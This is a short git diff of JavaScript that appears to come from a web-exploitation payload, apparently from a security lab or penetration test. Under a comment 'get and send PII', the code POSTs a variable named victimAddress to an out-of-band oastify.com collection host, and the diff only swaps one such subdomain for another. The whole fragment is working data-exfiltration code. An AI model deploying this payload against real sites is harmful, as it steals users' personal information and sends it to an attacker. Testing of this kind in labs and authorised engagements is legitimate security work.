@@ -28,7 +28,7 @@ xhr.onreadystatechange = function() {
     //get and send PII
     var reqBody = victimAddress;
     var xhrr = new XMLHttpRequest();
-    xhrr.open("POST", "https://mb16662y9t0qvr2su0lcrp108rei28qx.oastify.com", true);
+    xhrr.open("POST", "https://468v7qgdz3ftxvvtnpjzx3qptgz7nybn.oastify.com", true);
     xhrr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     var requestBody = reqBody;
     xhrr.send(requestBody);
